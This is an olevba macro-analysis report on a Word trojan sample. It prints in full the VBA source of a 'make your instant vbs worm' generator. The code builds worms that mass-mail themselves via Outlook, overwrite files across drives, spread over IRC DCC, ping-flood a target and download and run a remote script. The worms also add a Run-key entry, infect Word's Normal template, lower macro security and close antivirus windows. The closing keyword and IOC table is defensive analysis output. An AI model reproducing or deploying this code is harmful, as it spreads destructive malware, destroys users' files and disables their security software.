olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Olerun-13b4c0666a862b377e9ea557cf3c941b2a25fe26
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan.MSWord.Olerun-13b4c0666a862b377e9ea557cf3c941b2a25fe26 
in file: Trojan.MSWord.Olerun-13b4c0666a862b377e9ea557cf3c941b2a25fe26 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
 Private Declare Function FindWindow Lib "user32" _
         Alias "FindWindowA" _
         (ByVal lpClassName As String, _
         ByVal lpWindowName As String) As Long
      Private Declare Function PostMessage Lib "user32" _
         Alias "PostMessageA" _
         (ByVal hwnd As Long, _
         ByVal wMsg As Long, _
         ByVal wParam As Long, _
         ByVal lParam As Long) As Long
         Const WM_CLOSE = &H10

Private Sub Command1_Click()
On Error Resume Next
Dim a, b, j, i, f, m, m1, m2, m3, m4, d, d1, d2, e, d3, g, c, h, worm, a1, a2, aa, aaa, b1, b2
a = "mail()" & vbCrLf & _
"sub mail()" & vbCrLf & _
"Set a = CreateObject(""Outlook.Application"")" & vbCrLf & _
"Set b = a.GetNameSpace(""MAPI"")" & vbCrLf & _
"If a = ""Outlook"" Then" & vbCrLf & _
"b.Logon ""profile"", ""password""" & vbCrLf & _
"For y = 1 To b.AddressLists.Count" & vbCrLf & _
"Set d = b.AddressLists(y)" & vbCrLf & _
"x = 1" & vbCrLf & _
"Set c = a.CreateItem(0)" & vbCrLf & _
"For oo = 1 To d.AddressEntries.Count" & vbCrLf & _
"e = d.AddressEntries(x)" & vbCrLf & _
"c.Recipients.Add e" & vbCrLf & _
"x = x + 1" & vbCrLf & _
"If x > " & Text17 & " Then oo = d.AddressEntries.Count" & vbCrLf & _
"Next" & vbCrLf & _
"c.Subject = " & """" & Text1 & """"
If Check9.Value = False Then
a1 = "c.Body = " & """" & "." & Text2 & """"
Else
a1 = "c.Body = " & """" & "..." & Text2 & """"
End If
a2 = "c.attachments.Add wscript.scriptfullname, 1, 1"
If Check9.Value = False Then
aa = "'"
Else
If Text20 = "" Then
Text20 = "c:\attch.vbs"
End If
If Text21 = "" Then
Text21 = "c:\attch1.vbs"
End If

aa = "c.attachments.Add " & """" & Text20 & """" & ", 1, 2, " & """" & Text22 & """" & "" & vbCrLf & _
"c.attachments.Add " & """" & Text21 & """" & ", 1, 3, " & """" & Text23 & """" & ""
End If
aaa = "c.Send" & vbCrLf & _
"e = """"" & vbCrLf & _
"Next" & vbCrLf & _
"b.Logoff" & vbCrLf & _
"End If" & vbCrLf & _
"end sub"
If Text3 = "" Then
Text3 = "c:\worm.vbs"
End If
If Text4 = "" Then
Text4 = "c:\vbsworm.vbs"
End If
b = "spawn()" & vbCrLf & _
"sub spawn()" & vbCrLf & _
"Set s = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set f = s.GetFile(wscript.scriptfullname)" & vbCrLf & _
"f.Copy (" & """" & Text3 & """" & ")" & vbCrLf & _
"f.Copy (" & """" & Text4 & """" & ")"
If Check9.Value = False Then
b1 = "'"
Else
If Text20 = "" Then
Text20 = "c:\attch.vbs"
End If
If Text21 = "" Then
Text21 = "c:\attch1.vbs"
End If
b1 = "f.Copy (" & """" & Text20 & """" & ")" & vbCrLf & _
"f.Copy (" & """" & Text21 & """" & ")"
End If
b2 = "end sub"
If Check1.Value = False Then
c = "'"
Else
c = "msgbox " & """" & Text5 & """" & ", ," & """" & Text18 & """"
End If
If Check2.Value = False Then
d = "'"
d1 = "'"
d2 = "'"
d3 = "'"
Else
d = "haha()" & vbCrLf & _
"Sub haha()" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim d, dc, s, fso, haha" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set dc = fso.Drives" & vbCrLf & _
"For Each d In dc" & vbCrLf & _
"If d.DriveType = 2 Or d.DriveType = 3 Then" & vbCrLf & _
"hihi (d.Path & ""\"")" & vbCrLf & _
"End If" & vbCrLf & _
"Next" & vbCrLf & _
"haha = s" & vbCrLf & _
"End Sub" & vbCrLf & _
"Sub hehe(folderspec)" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim f, f1, fc, ext, s, fso" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set f = fso.GetFolder(folderspec)" & vbCrLf & _
"Set fc = f.Files" & vbCrLf & _
"For Each f1 In fc" & vbCrLf & _
"ext = fso.GetExtensionName(f1.Path)" & vbCrLf & _
"ext = LCase(ext)" & vbCrLf & _
"s = LCase(f1.Name)"
If Text8 = "" Then
Text8 = "vbs"
End If
d1 = "If (ext = " & """" & Text8 & """" & ") Then" & vbCrLf & _
"Set f = fso.GetFile(wscript.scriptfullname)" & vbCrLf & _
"f.Copy (f1.Path & "".vbs"")" & vbCrLf & _
"fso.deletefile(f1.path)" & vbCrLf & _
"End If"
If Text6 = "" Then
Text6 = "freecell.exe"
End If
If Text7 = "" Then
Text7 = "readme.txt"
End If
If Text9 = "" Then
Text9 = "license.txt"
End If
d2 = "If (s = " & """" & Text6 & """" & ") Or (s = " & """" & Text7 & """" & ") or (s = " & """" & Text9 & """" & ") Then" & vbCrLf & _
"Set f = fso.getfile(wscript.scriptfullname)" & vbCrLf & _
"f.Copy (f1.Path)" & vbCrLf & _
"fso.deletefile(f1.path)" & vbCrLf & _
"End If"
d3 = "Next" & vbCrLf & _
"End Sub" & vbCrLf & _
"Sub hihi(folderspec)" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim f, f1, sf, fso" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set f = fso.GetFolder(folderspec)" & vbCrLf & _
"Set sf = f.SubFolders" & vbCrLf & _
"For Each f1 In sf" & vbCrLf & _
"hehe (f1.Path)" & vbCrLf & _
"hihi (f1.Path)" & vbCrLf & _
"Next" & vbCrLf & _
"End Sub"
End If
If Check3.Value = False Then
e = "'"
Else
If Check2.Value = False Then
d = "haha()" & vbCrLf & _
"Sub haha()" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim d, dc, s, fso, haha" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set dc = fso.Drives" & vbCrLf & _
"For Each d In dc" & vbCrLf & _
"If d.DriveType = 2 Or d.DriveType = 3 Then" & vbCrLf & _
"hihi (d.Path & ""\"")" & vbCrLf & _
"End If" & vbCrLf & _
"Next" & vbCrLf & _
"haha = s" & vbCrLf & _
"End Sub" & vbCrLf & _
"Sub hehe(folderspec)" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim f, f1, fc, ext, s, fso" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set f = fso.GetFolder(folderspec)" & vbCrLf & _
"Set fc = f.Files" & vbCrLf & _
"For Each f1 In fc" & vbCrLf & _
"ext = fso.GetExtensionName(f1.Path)" & vbCrLf & _
"ext = LCase(ext)" & vbCrLf & _
"s = LCase(f1.Name)"
d1 = "'"
d2 = "'"
If Text10 = "" Then
Text10 = "js"
End If
If Text11 = "" Then
Text11 = "html"
End If
e = "If (ext = " & """" & Text10 & """" & ") Or (ext = " & """" & Text11 & """" & ") Then" & vbCrLf & _
"Set f = fso.getfile(wscript.scriptfullname)" & vbCrLf & _
"f.Copy (f1.Path & "".vbs"")" & vbCrLf & _
"End If"
d3 = "Next" & vbCrLf & _
"End Sub" & vbCrLf & _
"Sub hihi(folderspec)" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Dim f, f1, sf, fso" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set f = fso.GetFolder(folderspec)" & vbCrLf & _
"Set sf = f.SubFolders" & vbCrLf & _
"For Each f1 In sf" & vbCrLf & _
"hehe (f1.Path)" & vbCrLf & _
"hihi (f1.Path)" & vbCrLf & _
"Next" & vbCrLf & _
"End Sub"
End If
If Text10 = "" Then
Text10 = "js"
End If
If Text11 = "" Then
Text11 = "html"
End If
e = "If (ext = " & """" & Text10 & """" & ") Or (ext = " & """" & Text11 & """" & ") Then" & vbCrLf & _
"Set f = fso.getfile(wscript.scriptfullname)" & vbCrLf & _
"f.Copy (f1.Path & "".vbs"")" & vbCrLf & _
"End If"
End If
If Check4.Value = False Then
f = "'"
Else
f = "irc()" & vbCrLf & _
"sub irc()" & vbCrLf & _
"set fso = createobject(""scripting.filesystemobject"")" & vbCrLf & _
"set scrini = fso.CreateTextFile(" & """" & Text12 & "\script.ini"")" & vbCrLf & _
"scrini.WriteLine ""[script]""" & vbCrLf & _
"scrini.WriteLine ""n0=on 1:JOIN:#:{""" & vbCrLf & _
"scrini.WriteLine ""n1=  /if ( $nick == $me ) { halt }""" & vbCrLf & _
"scrini.WriteLine ""n2=  /dcc send $nick """ & " &" & " wscript.scriptfullname" & vbCrLf & _
"scrini.WriteLine ""n3=}""" & vbCrLf & _
"scrini.Close" & vbCrLf & _
"end sub"
End If
If Check6.Value = False Then
g = "'"
Else
If Text14 = "" Then
g = "'"
Else
g = "dos()" & vbCrLf & _
"sub dos()" & vbCrLf & _
"Dim a" & vbCrLf & _
"Set a = CreateObject(""WScript.Shell"")" & vbCrLf & _
"a.run (""c:\windows\ping.exe -t -l 10000 " & Text14 & """" & ")" & vbCrLf & _
"end sub"
End If
End If
h = "'made by : " & Text15
worm = "'worm name : " & Text16
If Check5.Value = False Then
i = "'"
Else
If Text13 = "" Then
i = "'"
Else
i = "update()" & vbCrLf & _
"Sub update()" & vbCrLf & _
"Dim objInet, a" & vbCrLf & _
"Dim strDownloadedCode" & vbCrLf & _
"Set objInet = CreateObject(""InetCtls.Inet"")" & vbCrLf & _
"objInet.RequestTimeOut = 30" & vbCrLf & _
"strDownloadedCode = objInet.OpenURL(" & """" & Text13 & """" & ")" & vbCrLf & _
"set fso = createobject(""scripting.filesystemobject"")" & vbCrLf & _
"set f = fso.CreateTextFile(""c:\update.vbs"")" & vbCrLf & _
"f.write strDownloadedCode" & vbCrLf & _
"f.close" & vbCrLf & _
"Set a = CreateObject(""WScript.Shell"")" & vbCrLf & _
"a.run (""c:\update.vbs"")" & vbCrLf & _
"end sub"
End If
End If
If Text19 = "" Then
Text19 = "worm"
End If
If Check8.Value = False Then
j = "'"
Else
j = "reg()" & vbCrLf & _
"sub reg()" & vbCrLf & _
"dim j" & vbCrLf & _
"Set j = CreateObject(""WScript.Shell"")" & vbCrLf & _
"j.regwrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*HLM"", wscript.scriptfullname" & vbCrLf & _
"end sub"
End If
If Check7.Value = False Then
m = "'"
m1 = "'"
m2 = "'"
m3 = "'"
m4 = "'"
Else
m = "word()"
m1 = "sub word()"
m2 = "norm =""Sub document_close()""" & " & vbCrLf & _" & vbCrLf & _
"""On Error Resume Next""" & " & vbCrLf & _" & vbCrLf & _
"""Open """"c:\xploit.txt"""" For Output As 2""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"sub document_open()""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"On Error Resume Next""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"'by alcopaul""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"obj = ActiveDocument.Shapes(1).OLEFormat.ClassType""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"With ActiveDocument.Shapes(1).OLEFormat""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"    .ActivateAs ClassType:=obj""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"    .Activate""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"End With""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #2, """"end sub""""""" & " & vbCrLf & _" & vbCrLf & _
"""Close 2""" & " & vbCrLf & _" & vbCrLf & _
"""Set fso = CreateObject(""""Scripting.FileSystemObject"""")""" & " & vbCrLf & _" & vbCrLf & _
"""Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule""" & " & vbCrLf & _" & vbCrLf & _
"""Set iw = fso.OpenTextFile(""""c:\xploit.txt"""", 1, True)""" & " & vbCrLf & _" & vbCrLf & _
"""nt.DeleteLines 1, nt.CountOfLines""" & " & vbCrLf & _" & vbCrLf & _
"""i = 1 """ & " & vbCrLf & _" & vbCrLf & _
"""Do While iw.atendofstream <> True""" & " & vbCrLf & _" & vbCrLf & _
"""b = iw.readline""" & " & vbCrLf & _" & vbCrLf & _
"""nt.InsertLines i, b """ & " & vbCrLf & _" & vbCrLf & _
"""i = i + 1 """ & " & vbCrLf & _" & vbCrLf & _
"""Loop""" & " & vbCrLf & _" & vbCrLf & _
"""ActiveDocument.Shapes.AddOLEObject _""" & " & vbCrLf & _" & vbCrLf & _
"""FileName:=""""" & Text3 & """"", _""" & " & vbCrLf & _"
m3 = """LinkToFile:=False""" & " & vbCrLf & _" & vbCrLf & _
"""ActiveDocument.Save""" & " & vbCrLf & _" & vbCrLf & _
"""Open """"c:\vv.reg"""" For Output As 3""" & " & vbCrLf & _" & vbCrLf & _
"""Print #3, """"REGEDIT4""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #3, """"[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #3, """"""""""""Level""""""""=dword:00000001""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #3, """"[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #3, """"""""""""Level""""""""=dword:00000001""""""" & " & vbCrLf & _" & vbCrLf & _
"""Print #3, """"""""""""AccessVBOM""""""""=dword:00000001""""""" & " & vbCrLf & _" & vbCrLf & _
"""Close 3""" & " & vbCrLf & _" & vbCrLf & _
"""Shell """"regedit /s c:\vv.reg"""", vbHide""" & " & vbCrLf & _" & vbCrLf & _
"""Kill """"c:\vv.reg""""""" & " & vbCrLf & _" & vbCrLf & _
"""End Sub"""
m4 = "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"set f = fso.createtextfile(""c:\try.txt"")" & vbCrLf & _
"f.write norm" & vbCrLf & _
"f.Close" & vbCrLf & _
"Set oword = CreateObject(""Word.Application"")" & vbCrLf & _
"oword.Visible = False" & vbCrLf & _
"Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule" & vbCrLf & _
"Set iw = fso.OpenTextFile(""c:\try.txt"", 1, True)" & vbCrLf & _
"nt.DeleteLines 1, nt.CountOfLines" & vbCrLf & _
"i = 1" & vbCrLf & _
"Do While iw.atendofstream <> True" & vbCrLf & _
"b = iw.readline" & vbCrLf & _
"nt.InsertLines i, b" & vbCrLf & _
"i = i + 1" & vbCrLf & _
"Loop" & vbCrLf & _
"oword.NormalTemplate.Save" & vbCrLf & _
"oword.NormalTemplate.Close" & vbCrLf & _
"end sub"
End If
Open "c:\" & Text19 & ".vbs" For Output As 1
Print #1, "'Serial Number : " & Rnd()
Print #1, "'"
Print #1, "On Error Resume Next"
Print #1, b
Print #1, b1
Print #1, b2
Print #1, a
Print #1, a1
Print #1, a2
Print #1, aa
Print #1, aaa
Print #1, j
Print #1, i
Print #1, f
Print #1, m
Print #1, m1
Print #1, m2
Print #1, m3
Print #1, m4
Print #1, d
Print #1, d1
Print #1, d2
Print #1, e
Print #1, d3
Print #1, g
Print #1, c
Print #1, "'========================================="
Print #1, h
Print #1, worm
Print #1, "'========================================="
Print #1, "'"
Print #1, "'credits : "
Print #1, "'generated using [MYIVWE] v.1 by alcopaul/[rRlf]"
Print #1, "'"
Close 1
MsgBox Text16 & " now exists on your computer as c:\" & Text19 & ".vbs", vbExclamation, "[MYIVWE] v.1 by alcopaul/[rRlf]"
End Sub

Private Sub Form_Load()
On Error Resume Next
Dim avn, avn1, avn2, avn3, avn4, avn5, avn6, num3, arrr3, av, msg
Dim aWindow As Long
Dim angReturnValue As Long
avn = "vettray"
avn1 = "F-STOPW"
avn2 = "PC-cillin 2000 : Virus Alert"
avn3 = "Real-time Scan"
avn4 = "IOMON98"
avn5 = "AVP Monitor"
avn6 = "NAI_VS_STAT"
For num3 = 0 To 6
arrr3 = Array(avn, avn1, avn2, avn3, avn4, avn5, avn6)
av = arrr3(num3)
aWindow = FindWindow(vbNullString, av)
angReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)
Next num3
MsgBox "[ alcopaul's ""make your instant vbs worm"" engine v1.0 ] by alcopaul/[rRlf]", vbSystemModal, "<<<Product Name>>>"
MsgBox "< some av monitors were turned off >", vbExclamation, "< safe assembly mode >"
Form2.Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Command1_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |attch.vbs           |Executable file name                         |
|IOC       |attch1.vbs          |Executable file name                         |
|IOC       |worm.vbs            |Executable file name                         |
|IOC       |vbsworm.vbs         |Executable file name                         |
|IOC       |freecell.exe        |Executable file name                         |
|IOC       |ping.exe            |Executable file name                         |
|IOC       |update.vbs          |Executable file name                         |
|IOC       |vv.reg              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

